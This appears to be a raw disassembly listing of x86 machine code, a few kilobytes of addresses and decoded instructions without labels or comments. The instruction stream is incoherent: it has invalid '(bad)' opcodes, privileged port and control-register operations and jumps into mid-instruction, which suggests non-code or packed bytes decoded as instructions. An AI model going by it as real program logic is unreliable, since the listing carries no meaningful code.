  41f1b2:	or     BYTE PTR [eax-0x341176a2],ch
  41f1b8:	inc    esp
  41f1b9:	mov    eax,0x3a9caa05
  41f1be:	jle    0x41f221
  41f1c0:	repnz mov DWORD PTR [ebp+0x6cdddcb3],ebx
  41f1c7:	addr16 loopne 0x41f1d0
  41f1ca:	leave  
  41f1cb:	adc    al,0x87
  41f1cd:	jecxz  0x41f23f
  41f1cf:	xchg   esp,eax
  41f1d0:	dec    edi
  41f1d1:	pop    esp
  41f1d2:	(bad)  
  41f1d3:	in     al,dx
  41f1d4:	mov    eax,0xb054021
  41f1d9:	pop    edi
  41f1da:	mov    edx,0xb3bb2d53
  41f1df:	push   edx
  41f1e0:	ret    0x8d49
  41f1e3:	mov    dh,0x8b
  41f1e5:	loopne 0x41f22d
  41f1e7:	mov    ebp,cs
  41f1e9:	imul   edi,DWORD PTR [esi],0x6f
  41f1ec:	mov    ecx,0xf3c8ba80
  41f1f1:	aad    0x4
  41f1f3:	mov    edx,0x3832a464
  41f1f8:	repz inc ebp
  41f1fa:	sar    BYTE PTR [ebx-0x28],0x74
  41f1fe:	lahf   
  41f1ff:	jle    0x41f22f
  41f201:	xor    esi,DWORD PTR [ebx+eiz*8-0x2afc455]
  41f208:	test   eax,0x90d404c8
  41f20d:	pop    ebx
  41f20e:	push   ecx
  41f20f:	shl    BYTE PTR [ebx],1
  41f211:	out    0x2,al
  41f213:	add    ch,ch
  41f215:	push   0xb90481c9
  41f21a:	test   DWORD PTR [esi+0x55],ebx
  41f21d:	xchg   BYTE PTR [esi-0x13],al
  41f220:	scas   al,BYTE PTR es:[edi]
  41f221:	aas    
  41f222:	scas   al,BYTE PTR es:[edi]
  41f223:	out    0xec,eax
  41f225:	mov    cl,0xba
  41f227:	and    al,BYTE PTR [ebp+0x7044090c]
  41f22d:	add    eax,0xfba93e39
  41f232:	enter  0x61d1,0x30
  41f236:	loope  0x41f20a
  41f238:	loope  0x41f1f4
  41f23a:	in     eax,dx
  41f23b:	or     eax,0x6e14a735
  41f240:	enter  0xe470,0xd0
  41f244:	inc    esi
  41f245:	push   ecx
  41f246:	pop    DWORD PTR [eax]
	...
  41f250:	add    BYTE PTR [eax],dh
  41f252:	ret    0xe921
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx+0x7e],ebx
  41f25e:	cmc    
  41f25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f260:	adc    DWORD PTR [ecx+0x6d],ebx
  41f263:	add    DWORD PTR [eax],eax
  41f265:	scas   al,BYTE PTR es:[edi]
  41f266:	add    eax,DWORD PTR [eax]
  41f268:	add    BYTE PTR [edx-0x5af1e7ef],ah
  41f26e:	mov    WORD PTR [edi+0x1e],ss
  41f271:	clc    
  41f272:	mov    edx,0xd1a5968
  41f277:	cld    
  41f278:	rcr    BYTE PTR [esi-0x53],1
  41f27b:	xchg   DWORD PTR [ebp-0x16233189],edx
  41f281:	sbb    bl,bh
  41f283:	dec    ebp
  41f284:	mov    dl,0x10
  41f286:	mov    ds:0xcc477978,eax
  41f28b:	fs inc ecx
  41f28d:	rol    DWORD PTR [edi+0x44575df1],cl
  41f293:	dec    esp
  41f294:	push   ss
  41f295:	loop   0x41f26e
  41f297:	or     DWORD PTR [edx+0x6],0x6b
  41f29b:	mov    esi,0x52ed3f8f
  41f2a0:	mov    edx,0x1f5e291d
  41f2a5:	adc    al,0x74
  41f2a7:	adc    ah,BYTE PTR [edi+0x42]
  41f2aa:	rcl    dl,0x69
  41f2ad:	mov    ch,0x66
  41f2af:	lods   eax,DWORD PTR ds:[esi]
  41f2b0:	sbb    BYTE PTR [esi],al
  41f2b2:	sbb    DWORD PTR [ebx+0x55b53481],0x3d84f63e
  41f2bc:	aaa    
  41f2bd:	outs   dx,BYTE PTR ds:[esi]
  41f2be:	loop   0x41f2d9
  41f2c0:	mov    dh,0xf8
  41f2c2:	fs mov dh,0xc0
  41f2c5:	dec    edx
  41f2c6:	shl    DWORD PTR [eax-0x29137c1d],0x7f
  41f2cd:	inc    ebx
  41f2ce:	fild   QWORD PTR [esi-0x32e4660a]
  41f2d4:	and    ebp,DWORD PTR [ebx]
  41f2d6:	xor    BYTE PTR [eax+edx*4+0x3],0x7c
  41f2db:	jne    0x41f2fd
  41f2dd:	and    esp,DWORD PTR [edx+0x5e]
  41f2e0:	and    eax,0xd15baf5
  41f2e5:	nop
  41f2e6:	cdq    
  41f2e7:	pop    ebx
  41f2e8:	stos   BYTE PTR es:[edi],al
  41f2e9:	push   ecx
  41f2ea:	int3   
  41f2eb:	in     eax,0xe0
  41f2ed:	mov    edi,0x2d7000f
  41f2f2:	xchg   edi,eax
  41f2f3:	cmp    eax,0x535c3446
  41f2f8:	mov    WORD PTR [ebx+0x345e7f21],es
  41f2fe:	scas   eax,DWORD PTR es:[edi]
  41f2ff:	fstp   TBYTE PTR [ebx+esi*1]
  41f302:	icebp  
  41f303:	inc    esp
  41f304:	rcl    DWORD PTR [edx+eax*2],0xe8
  41f308:	sti    
  41f309:	mov    ebp,0xb73362a8
  41f30e:	push   0x99925300
  41f313:	pop    ss
  41f314:	inc    esi
  41f315:	sbb    al,0x7c
  41f317:	inc    esi
  41f318:	dec    esp
  41f319:	mov    ecx,0xcd69252f
  41f31e:	fcomp  st(3)
  41f320:	rcpps  xmm0,XMMWORD PTR [edx+0x4]
  41f324:	shl    ebx,cl
  41f326:	push   0xffffffac
  41f328:	xchg   BYTE PTR [ebx+0x5],dh
  41f32b:	lods   al,BYTE PTR ds:[esi]
  41f32c:	add    esi,eax
  41f32e:	cmp    eax,0xf3aa2340
  41f333:	scas   al,BYTE PTR es:[edi]
  41f334:	popf   
  41f335:	xchg   edx,eax
  41f336:	in     al,dx
  41f337:	and    BYTE PTR [edi-0x75],cl
  41f33a:	push   ebx
  41f33b:	imul   esp,ebx,0xe
  41f33e:	and    esp,DWORD PTR [ecx+0x6e308bd4]
  41f344:	mov    ebp,0xc940148e
  41f349:	add    edx,edx
  41f34b:	push   0xffffffab
  41f34d:	push   eax
  41f34e:	sahf   
  41f34f:	pop    ebp
  41f350:	inc    edx
  41f351:	into   
  41f352:	or     al,0x1b
  41f354:	cmp    al,BYTE PTR ds:0xafc901f7
  41f35a:	jge    0x41f336
  41f35c:	mov    dh,0x6a
  41f35e:	mov    edi,0x72fe1e2a
  41f363:	mov    ds:0xe5519e1f,al
  41f368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f369:	aaa    
  41f36a:	repz sub eax,0x95e81bc7
  41f370:	adc    al,0xc0
  41f372:	dec    esi
  41f373:	ss stc 
  41f375:	in     eax,0x20
  41f377:	add    ecx,DWORD PTR ds:0x2381390f
  41f37d:	jns    0x41f33e
  41f37f:	fstp   TBYTE PTR [eax]
  41f381:	lock dec esi
  41f383:	sub    DWORD PTR [edx-0x20],eax
  41f386:	adc    ebp,DWORD PTR [eax+0x372545db]
  41f38c:	hlt    
  41f38d:	fs jns 0x41f32c
  41f390:	xor    eax,0x6a1d50ff
  41f395:	and    ecx,0x18dff66a
  41f39b:	stc    
  41f39c:	lods   al,BYTE PTR ds:[esi]
  41f39d:	xor    DWORD PTR [edx-0x2],esp
  41f3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3a1:	jne    0x41f346
  41f3a3:	inc    edx
  41f3a4:	xor    ebp,DWORD PTR [edx]
  41f3a6:	mov    ebx,0xda83debc
  41f3ab:	mov    edx,0xd48d811f
  41f3b0:	pushf  
  41f3b1:	dec    esi
  41f3b2:	jnp    0x41f3aa
  41f3b4:	popa   
  41f3b5:	adc    eax,0xf60f5190
  41f3ba:	inc    edx
  41f3bb:	add    al,0x27
  41f3bd:	ins    DWORD PTR es:[edi],dx
  41f3be:	add    eax,0xc059bfa0
  41f3c3:	fnstcw WORD PTR [esi-0x6e]
  41f3c6:	or     BYTE PTR [esi],0x55
  41f3c9:	jle    0x41f433
  41f3cb:	lock addps xmm0,XMMWORD PTR [ebp-0xbd603d3]
  41f3d3:	or     BYTE PTR [eax-0x334fa2e7],dh
  41f3d9:	xchg   ebx,eax
  41f3da:	test   BYTE PTR [edi-0x6b],cl
  41f3dd:	mov    edi,0x566db38
  41f3e2:	jmp    0xd18cc492
  41f3e7:	daa    
  41f3e8:	inc    ebp
  41f3e9:	cld    
  41f3ea:	dec    edi
  41f3eb:	xor    ah,ch
  41f3ed:	mov    bh,0x28
  41f3ef:	imul   edx,ecx,0x4f
  41f3f2:	dec    esi
  41f3f3:	cld    
  41f3f4:	mov    dl,0xc7
  41f3f6:	adc    esp,DWORD PTR [edi+0x52]
  41f3f9:	xor    DWORD PTR [edx-0x29],edi
  41f3fc:	mov    ecx,0xd8f4433e
  41f401:	test   al,0x72
  41f403:	outs   dx,DWORD PTR ds:[esi]
  41f404:	fnstsw WORD PTR [ecx]
  41f406:	jae    0x41f3ad
  41f408:	pop    ebx
  41f409:	mov    al,0x7d
  41f40b:	fidivr DWORD PTR [eax-0x4f]
  41f40e:	push   ebx
  41f40f:	push   0xbeed2369
  41f414:	add    BYTE PTR [esi],ah
  41f416:	repnz in al,0x69
  41f419:	jbe    0x41f494
  41f41b:	mov    al,ds:0xffdfc73a
  41f420:	sub    al,cl
  41f422:	inc    ebx
  41f423:	add    bl,BYTE PTR [esi]
  41f425:	es mov esi,0xa3747d51
  41f42b:	fistp  WORD PTR [edx]
  41f42d:	into   
  41f42e:	ds push 0xffffff87
  41f431:	ins    BYTE PTR es:[edi],dx
  41f432:	or     bh,BYTE PTR [ebp-0x12]
  41f435:	(bad)  
  41f436:	pop    edi
  41f437:	jg     0x41f477
  41f439:	(bad)  
  41f43a:	ds jg  0x41f489
  41f43d:	scas   al,BYTE PTR es:[edi]
  41f43e:	dec    ecx
  41f43f:	or     cl,BYTE PTR [esi+ecx*2-0x5c5e403c]
  41f446:	add    BYTE PTR [eax],al
  41f448:	lock rcr DWORD PTR [ebx+edi*2+0x16ba23c],1
  41f450:	xor    edx,DWORD PTR [ebp-0x16]
  41f453:	cmp    DWORD PTR [eax+0x11],edi
  41f456:	mov    dh,0x88
  41f458:	xor    DWORD PTR [ecx],0xffffffe5
  41f45b:	call   0x8036:0xd82c6af8
  41f462:	mov    ebx,0xe2479916
  41f467:	add    BYTE PTR [ebx],bl
  41f469:	leave  
  41f46a:	and    al,0xf3
  41f46c:	push   ebp
  41f46d:	aaa    
  41f46e:	fcom   QWORD PTR [ecx]
  41f470:	and    dl,BYTE PTR [ebx]
  41f472:	cmp    edi,DWORD PTR [edx-0x55]
  41f475:	xchg   esp,eax
  41f476:	adc    ah,dh
  41f478:	in     al,dx
  41f479:	jmp    0x335227a5
  41f47e:	push   ecx
  41f47f:	pop    ss
  41f480:	adc    bh,ch
  41f482:	arpl   WORD PTR [edi+0x56],di
  41f485:	(bad)  
  41f487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f488:	in     al,dx
  41f489:	cmp    al,0x71
  41f48b:	pop    edi
  41f48c:	cmp    ah,BYTE PTR [ebx-0x59408c4b]
  41f492:	sbb    BYTE PTR [esi+0x66],cl
  41f495:	mov    bl,0x3f
  41f497:	sub    al,0x92
  41f499:	fadd   QWORD PTR ds:[ecx+0xde82e5d]
  41f4a0:	xor    DWORD PTR [ecx-0x2],eax
  41f4a3:	repz push ebx
  41f4a5:	push   ebp
  41f4a6:	push   0xe522f496
  41f4ab:	es popf 
  41f4ad:	fwait
  41f4ae:	stos   BYTE PTR es:[edi],al
  41f4af:	or     al,0x63
  41f4b1:	jle    0x41f502
  41f4b3:	lods   eax,DWORD PTR ds:[esi]
  41f4b4:	mov    bh,0x92
  41f4b6:	xlat   BYTE PTR ds:[ebx]
  41f4b7:	fwait
  41f4b8:	das    
  41f4b9:	(bad)  
  41f4ba:	jne    0x41f496
  41f4bc:	xchg   esi,eax
  41f4bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4be:	pop    es
  41f4bf:	xor    DWORD PTR [ecx],edi
  41f4c1:	or     al,0x1
  41f4c4:	adc    ebx,DWORD PTR [edx+0x65a7600]
  41f4ca:	mov    edx,0x33d4e43a
  41f4cf:	xchg   edx,eax
  41f4d0:	imul   ecx,esi,0xe4d7cd46
  41f4d6:	call   0x8c2c:0x38ff2c48
  41f4dd:	xor    al,0x8e
  41f4df:	(bad)  
  41f4e0:	mov    ebx,0x8bd21223
  41f4e5:	push   0xffffffac
  41f4e7:	rcr    BYTE PTR ds:0xe46fa629,0x58
  41f4ee:	aas    
  41f4ef:	cmp    al,0x84
  41f4f1:	and    DWORD PTR [edx],ebx
  41f4f3:	mov    dl,0x5b
  41f4f5:	bound  ebp,QWORD PTR [edi]
  41f4f7:	imul   edx,DWORD PTR [ebp-0x75f248fe],0x3b
  41f4fe:	mov    ch,0xab
  41f500:	repnz fisubr WORD PTR [ebx]
  41f503:	xchg   edx,eax
  41f504:	aad    0x47
  41f506:	jo     0x41f4de
  41f508:	and    ebp,DWORD PTR es:[ebx-0x39]
  41f50c:	inc    esp
  41f50d:	and    BYTE PTR [esi-0x1e437abe],ah
  41f513:	adc    eax,0x58aadf2e
  41f518:	mov    eax,ds:0x622f9f89
  41f51d:	shl    BYTE PTR ds:0xf405b0dc,1
  41f523:	(bad)  
  41f524:	lea    esi,[ecx+0x22]
  41f527:	les    ebp,FWORD PTR [edi+0x519edfe4]
  41f52d:	push   esp
  41f52e:	aas    
  41f52f:	push   edi
  41f530:	fidivr DWORD PTR [esi+0x7bf9acec]
  41f536:	loope  0x41f577
  41f538:	pop    ecx
  41f539:	lds    ecx,FWORD PTR [ebx-0x51185a60]
  41f53f:	pop    es
  41f540:	pop    edi
  41f541:	fstp   QWORD PTR [edx+0x654f2fec]
  41f547:	adc    al,0x23
  41f549:	arpl   WORD PTR [edi+0x2ba5c544],cx
  41f54f:	push   esi
  41f550:	lods   eax,DWORD PTR ds:[esi]
  41f551:	lods   eax,DWORD PTR ds:[esi]
  41f552:	test   eax,0xadb54fd1
  41f557:	cdq    
  41f558:	cmp    BYTE PTR [edx],dh
  41f55a:	adc    eax,DWORD PTR [ebx-0x42b31c]
  41f560:	mov    ch,0x24
  41f562:	fbld   TBYTE PTR [ebp+0x3d6fc28b]
  41f568:	cdq    
  41f569:	sbb    eax,0x4ac88950
  41f56e:	iret   
  41f56f:	lds    edi,FWORD PTR ds:0xc2f53d68
  41f575:	outs   dx,DWORD PTR ds:[esi]
  41f576:	xor    BYTE PTR [ebx+eax*2-0x9076062],al
  41f57d:	xor    eax,0x7bad1595
  41f582:	sub    eax,0x498a3de5
  41f587:	sbb    BYTE PTR [ecx+0x10],cl
  41f58a:	je     0x41f5bf
  41f58c:	sub    eax,0xc37c2c71
  41f591:	lods   eax,DWORD PTR ds:[esi]
  41f592:	sar    edi,0x42
  41f595:	jl     0x41f5c8
  41f597:	(bad)  
  41f598:	dec    ebp
  41f599:	das    
  41f59a:	xchg   BYTE PTR [edx-0x7e952685],dl
  41f5a0:	dec    esp
  41f5a1:	retf   0x2d1e
  41f5a4:	sbb    BYTE PTR [eax-0x1e92250d],bh
  41f5aa:	mov    BYTE PTR [edi],bh
  41f5ac:	push   ebx
  41f5ad:	imul   esi,edi,0x45
  41f5b0:	bound  esp,QWORD PTR [edx]
  41f5b2:	lds    ebp,FWORD PTR [edi]
  41f5b4:	das    
  41f5b5:	sbb    al,0x52
  41f5b7:	xchg   edx,eax
  41f5b8:	mov    WORD PTR [ecx],es
  41f5ba:	add    ebp,DWORD PTR [edx]
  41f5bc:	xlat   BYTE PTR ds:[ebx]
  41f5bd:	repz or ch,BYTE PTR [eax-0x44]
  41f5c1:	sbb    esi,esp
  41f5c3:	cmp    cl,BYTE PTR [edi-0x4ba1b347]
  41f5c9:	inc    DWORD PTR [edx-0x3f]
  41f5cc:	mov    ds,WORD PTR [ebp-0x55]
  41f5cf:	sbb    eax,0xf7751445
  41f5d4:	pop    ss
  41f5d5:	jmp    0x4d9f9c2
  41f5da:	fisttp QWORD PTR [ebx+0x1bc5258e]
  41f5e0:	mul    eax
  41f5e2:	lock add al,0x7a
  41f5e5:	ret    
  41f5e6:	je     0x41f5ac
  41f5e8:	rol    BYTE PTR [ebx+ecx*2-0x711f20ad],cl
  41f5ef:	fs nop
  41f5f1:	mov    ecx,0x6b258056
  41f5f6:	sti    
  41f5f7:	ficomp WORD PTR [ebx-0x6b]
  41f5fa:	fs mov edx,0xa2176f94
  41f600:	mov    ecx,0xb81d6c20
  41f605:	ror    BYTE PTR [ecx+0x58e770b6],1
  41f60b:	fsub   QWORD PTR [edi+eiz*2]
  41f60e:	or     bh,bh
  41f610:	xor    edx,DWORD PTR [ebx+0x41]
  41f613:	scas   al,BYTE PTR es:[edi]
  41f614:	ret    0x3ae9
	...
  41f61f:	add    BYTE PTR [eax],al
  41f621:	inc    edx
  41f622:	add    eax,0x65676020
  41f627:	inc    edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	mov    eax,ds:0x79291fa
  41f632:	jno    0x41f635
  41f634:	add    BYTE PTR [esi-0x68fffffd],ch
  41f63a:	lods   al,BYTE PTR ds:[esi]
  41f63b:	mov    bl,0x22
  41f63d:	pop    edi
  41f63e:	jle    0x41f5f1
  41f640:	dec    esi
  41f641:	xchg   edx,eax
  41f642:	jbe    0x41f62d
  41f644:	push   eax
  41f645:	push   0xffffffbe
  41f647:	(bad)  
  41f648:	xor    ebp,ecx
  41f64a:	mov    ah,0xa8
  41f64c:	xchg   ebx,eax
  41f64d:	out    0xec,eax
  41f64f:	or     bh,BYTE PTR [ebp+0x22]
  41f652:	push   ebx
  41f653:	icebp  
  41f654:	xor    BYTE PTR [ebp-0x5ff1ea7d],bh
  41f65a:	pop    ss
  41f65b:	stos   BYTE PTR es:[edi],al
  41f65c:	or     DWORD PTR [ebx],ecx
  41f65e:	lea    ecx,[ecx-0x70]
  41f661:	mov    edx,0x6f7958b7
  41f666:	inc    esi
  41f667:	ror    BYTE PTR [edx-0x15],0x6a
  41f66b:	test   bl,ah
  41f66d:	std    
  41f66e:	daa    
  41f66f:	mov    esi,0x4e9656a3
  41f674:	sub    al,0x37
  41f676:	pop    esi
  41f677:	cld    
  41f678:	and    al,0x48
  41f67a:	rcr    DWORD PTR [eax+edx*4+0x2d],0x47
  41f67f:	inc    ebp
  41f680:	jbe    0x41f612
  41f682:	fdivr  st(0),st
  41f684:	std    
  41f685:	(bad)  
  41f686:	lods   eax,DWORD PTR ds:[esi]
  41f687:	(bad)  
  41f688:	cli    
  41f689:	push   esp
  41f68a:	in     al,0x2d
  41f68c:	jns    0x41f61b
  41f68e:	mov    ch,0x37
  41f690:	std    
  41f691:	jg     0x41f662
  41f693:	fidivr WORD PTR [ecx-0x222a9a9f]
  41f69a:	push   ebx
  41f69b:	scas   al,BYTE PTR es:[edi]
  41f69c:	mov    DWORD PTR [ebx+0x5],ebp
  41f69f:	add    al,0x9
  41f6a1:	lea    edi,[ebx-0x15f422a8]
  41f6a7:	xchg   DWORD PTR [ebx+eiz*8],esi
  41f6aa:	push   0x7d
  41f6ac:	pop    ss
  41f6ad:	and    DWORD PTR [ecx-0x1b],edx
  41f6b0:	ss in  al,0x29
  41f6b3:	push   0x6f7f489f
  41f6b8:	sbb    dh,BYTE PTR [eax+ecx*1+0x1c]
  41f6bc:	out    0x10,al
  41f6be:	aad    0x65
  41f6c0:	jge    0x41f679
  41f6c2:	pop    edx
  41f6c3:	cmp    al,0xdb
  41f6c5:	xchg   esp,eax
  41f6c6:	in     al,dx
  41f6c7:	pusha  
  41f6c8:	and    al,0x18
  41f6ca:	xor    eax,0x9fd13c89
  41f6cf:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41f6d1:	pop    ebx
  41f6d2:	dec    di
  41f6d4:	mov    esi,0x608f4809
  41f6d9:	add    eax,0x64afbbf9
  41f6de:	sub    DWORD PTR [edx],0x817df2db
  41f6e4:	ror    BYTE PTR [esi],0x39
  41f6e7:	test   BYTE PTR [ecx-0x7d7ad43a],dl
  41f6ed:	cmp    BYTE PTR [ecx+0x26],ch
  41f6f0:	ret    
  41f6f1:	test   cl,bl
  41f6f3:	sub    al,0x6a
  41f6f5:	rol    DWORD PTR [eax-0x4],1
  41f6f8:	je     0x41f6bb
  41f6fa:	pop    es
  41f6fb:	mov    cs,WORD PTR ds:0x8dd0960a
  41f701:	iret   
  41f702:	xor    edi,DWORD PTR [ebx-0x73]
  41f705:	xor    edi,esp
  41f707:	cmp    al,0x30
  41f709:	or     DWORD PTR [edx+edx*2-0x23ff9567],ecx
  41f710:	mov    ecx,0xb3e217f7
  41f715:	cmp    DWORD PTR [eax],0x74
  41f718:	mov    ds:0xb840693b,eax
  41f71d:	imul   edi,DWORD PTR ds:0x83421105,0xfffffff3
  41f724:	rcr    ah,cl
  41f726:	out    0x3c,al
  41f728:	push   es
  41f729:	jns    0x41f704
  41f72b:	pop    ds
  41f72c:	stos   DWORD PTR es:[edi],eax
  41f72d:	out    0xb5,al
  41f72f:	pusha  
  41f730:	or     al,0xb4
  41f732:	xor    al,0x52
  41f734:	sbb    ebp,DWORD PTR [ebp-0x233e54a]
  41f73a:	fcomip st,st(6)
  41f73c:	call   0x8bc8:0x1e9bbba1
  41f743:	fucom  st(5)
  41f745:	sti    
  41f746:	clc    
  41f747:	int3   
  41f748:	aaa    
  41f749:	pop    edi
  41f74a:	aam    0x8a
  41f74c:	loopne 0x41f73a
  41f74e:	lods   eax,DWORD PTR ds:[esi]
  41f74f:	mov    cl,0x33
  41f751:	or     DWORD PTR [ecx],eax
  41f753:	xchg   ebp,eax
  41f754:	or     bh,al
  41f756:	das    
  41f757:	fs inc ebx
  41f759:	popf   
  41f75a:	xor    DWORD PTR [edx+0x743df79],edx
  41f760:	scas   al,BYTE PTR es:[edi]
  41f761:	int3   
  41f762:	repz xor DWORD PTR [edx],edi
  41f765:	shr    DWORD PTR [edi-0x2f09344f],1
  41f76b:	mov    edx,0x27f8c132
  41f770:	pop    edi
  41f771:	or     al,0x89
  41f773:	shl    edi,cl
  41f775:	jns    0x41f74e
  41f777:	retf   0x6df2
  41f77a:	mov    cl,0x99
  41f77c:	sbb    DWORD PTR [edi+0x5c27d51c],0x3de17f6e
  41f786:	cs retf 0xa840
  41f78a:	(bad)  
  41f78b:	stos   DWORD PTR es:[edi],eax
  41f78c:	pop    ds
  41f78d:	les    ebx,FWORD PTR [ecx]
  41f78f:	cwde   
  41f790:	jmp    0x41f7c9
  41f792:	call   0xc8f2:0x834cf85e
  41f799:	stc    
  41f79a:	mov    BYTE PTR [ecx+0x21f3e018],bh
  41f7a0:	sbb    bl,ch
  41f7a2:	jp     0x41f764
  41f7a4:	pop    ss
  41f7a5:	clc    
  41f7a6:	enter  0x2982,0xb9
  41f7aa:	mov    dl,0xfe
  41f7ac:	and    DWORD PTR [edi-0x501a3646],edx
  41f7b2:	in     eax,dx
  41f7b3:	add    ecx,edi
  41f7b5:	dec    ecx
  41f7b6:	pusha  
  41f7b7:	push   ss
  41f7b8:	loopne 0x41f7d3
  41f7ba:	push   0xffffff90
  41f7bc:	jnp    0x41f80d
  41f7be:	sub    al,0x4
  41f7c0:	mov    eax,ds:0x3870b96c
  41f7c5:	add    BYTE PTR [edi-0x3a],0x5a
  41f7c9:	or     eax,0x4947091b
  41f7ce:	sub    al,0x30
  41f7d0:	cmp    ch,al
  41f7d2:	pop    ss
  41f7d3:	das    
  41f7d4:	out    0x8a,eax
  41f7d6:	imul   eax,ebx,0xf326d767
  41f7dc:	gs and eax,0x3be03a5e
  41f7e2:	sbb    eax,0xb516dfbc
  41f7e7:	mov    ebx,0x300aa672
  41f7ec:	sar    ah,1
  41f7ee:	push   ebx
  41f7ef:	shl    DWORD PTR [esi+edx*8+0x16],1
  41f7f3:	cs call 0xadb8:0xfb5cbf4a
  41f7fb:	imul   eax,edx,0x2c
  41f7fe:	cmp    DWORD PTR [edx+0x37],0x40255744
  41f805:	or     bl,ah
  41f807:	push   eax
  41f808:	dec    ebx
  41f809:	aas    
  41f80a:	nop
  41f80b:	loop   0x41f7cd
  41f80d:	adc    esp,DWORD PTR [ecx+esi*4]
  41f810:	push   ebp
  41f811:	das    
  41f812:	and    edi,eax
  41f814:	and    esp,ecx
  41f816:	and    bh,BYTE PTR [eax+0x90b13ad]
  41f81c:	push   0xe5627acb
  41f821:	and    BYTE PTR ds:[eax],0xe1
  41f825:	cmp    DWORD PTR [edx],edx
  41f827:	stc    
  41f828:	dec    esi
  41f829:	frstor [esi]
  41f82b:	outs   dx,BYTE PTR ds:[esi]
  41f82c:	enter  0xde28,0x54
  41f830:	out    0x41,eax
  41f832:	gs mov DWORD PTR ds:[edi+eiz*1],eax
  41f837:	pop    ecx
  41f838:	sbb    bl,BYTE PTR [ecx]
  41f83a:	sar    DWORD PTR [edi-0x7e9f6004],1
  41f840:	pusha  
  41f841:	pop    ds
  41f842:	xor    ecx,eax
  41f844:	test   BYTE PTR [esp-0x518e5e9f],ah
  41f84b:	repnz add eax,0x277a7e0c
  41f851:	add    eax,DWORD PTR [esi-0x701bdda]
  41f857:	push   cs
  41f858:	mov    ch,0xf4
  41f85a:	or     al,0x4f
  41f85c:	or     eax,0x6cdc0313
  41f861:	jecxz  0x41f8d0
  41f863:	xchg   edi,eax
  41f864:	or     DWORD PTR [edx+0x7d],ebx
  41f867:	jecxz  0x41f839
  41f869:	pop    edx
  41f86a:	data16 adc al,0x75
  41f86d:	push   eax
  41f86e:	clc    
  41f86f:	xor    eax,0xb2180468
  41f874:	ret    0x93b2
  41f877:	mov    ds:0x30677f4b,al
  41f87c:	xor    DWORD PTR [edx],esi
  41f87e:	xor    al,0x44
  41f880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f881:	adc    al,BYTE PTR [eax+0x6f]
  41f884:	and    esi,esi
  41f886:	mov    esi,0xbd97b343
  41f88b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f88c:	adc    bl,BYTE PTR [edx+0x302f01ce]
  41f892:	aam    0x18
  41f894:	adc    eax,0xcf47253
  41f899:	mov    ecx,0xd114baea
  41f89e:	jl     0x41f87f
  41f8a0:	jae    0x41f8c9
  41f8a2:	fstp   DWORD PTR [ebp-0x16]
  41f8a5:	push   esp
  41f8a6:	mov    cr6,ecx
  41f8a9:	xchg   ebp,eax
  41f8aa:	aam    0x70
  41f8ac:	pop    ebx
  41f8ad:	push   eax
  41f8ae:	push   esi
  41f8af:	sbb    al,0x4
  41f8b1:	xchg   edi,eax
  41f8b2:	retf   
  41f8b3:	jge    0x41f883
  41f8b5:	daa    
  41f8b6:	imul   esp,DWORD PTR [ebx],0xd1ae8d54
  41f8bc:	cmp    cl,BYTE PTR [edi+0x13f801a1]
  41f8c2:	popf   
  41f8c3:	sbb    dh,ah
  41f8c5:	fdivr  QWORD PTR [edi]
  41f8c7:	addr16 mov edx,0x1a900886
  41f8cd:	std    
  41f8ce:	push   eax
  41f8cf:	out    dx,al
  41f8d0:	inc    ebp
  41f8d1:	push   0x64cf7172
  41f8d6:	aas    
  41f8d7:	add    DWORD PTR [ebp+edx*1+0x1c],ebx
  41f8db:	or     edi,DWORD PTR [edi]
  41f8dd:	(bad)  
  41f8df:	mov    eax,esp
  41f8e1:	enter  0xfe0d,0x41
  41f8e5:	fwait
  41f8e6:	adc    eax,0x668a90a
  41f8eb:	mov    dl,0xb3
  41f8ed:	mov    ebx,DWORD PTR [ecx]
  41f8ef:	mov    al,ds:0x8c9dde1f
  41f8f4:	mov    bl,0x25
  41f8f6:	sbb    eax,0xce09a520
  41f8fb:	pushf  
  41f8fc:	in     al,dx
  41f8fd:	add    eax,0x9176c489
  41f902:	add    bl,bh
  41f904:	cmp    al,0x73
  41f906:	push   ecx
  41f907:	mov    bh,0x5b
  41f909:	fwait
  41f90a:	imul   ecx,DWORD PTR [eax],0x20
  41f90d:	aad    0xa2
  41f90f:	bound  ecx,QWORD PTR [esi+ebp*8+0x44141981]
  41f916:	xchg   ebp,eax
  41f917:	cmpps  xmm4,XMMWORD PTR [eax-0xc],0x9f
  41f91c:	bound  ebx,QWORD PTR [edi+0x64]
  41f91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f920:	pop    es
  41f921:	cmc    
  41f922:	fwait
  41f923:	inc    esi
  41f924:	or     al,0xba
  41f926:	in     al,dx
  41f927:	jno    0x41f908
  41f929:	inc    BYTE PTR [ebx]
  41f92b:	mov    ds:0x33e1f902,eax
  41f930:	dec    edi
  41f931:	dec    ebp
  41f932:	cmp    eax,0xaee2c08c
  41f937:	mov    esi,0x181a90e3
  41f93c:	mov    al,ds:0xf355f52a
  41f941:	mul    BYTE PTR [eax]
  41f943:	(bad)  [edx-0x2e]
  41f946:	xchg   ebp,eax
  41f947:	in     al,0x94
  41f949:	pop    edi
  41f94a:	and    ebx,DWORD PTR [eax+0x10]
  41f94d:	scas   eax,DWORD PTR es:[edi]
  41f94e:	les    eax,FWORD PTR [ebx]
  41f950:	cmp    bl,bl
  41f952:	pop    ebx
  41f953:	popf   
  41f954:	jp     0x41f903
  41f956:	xor    bl,bh
  41f958:	pop    ebx
  41f959:	adc    BYTE PTR [esi],0x61
  41f95c:	adc    ebp,eax
  41f95e:	push   ecx
  41f95f:	loope  0x41f942
  41f961:	cmp    BYTE PTR [ebx-0x77fe8c97],bh
  41f967:	push   es
  41f968:	data16 cmp bl,BYTE PTR [eax]
  41f96b:	(bad)  
  41f96d:	mov    ah,0x87
  41f96f:	sbb    ch,ah
  41f971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
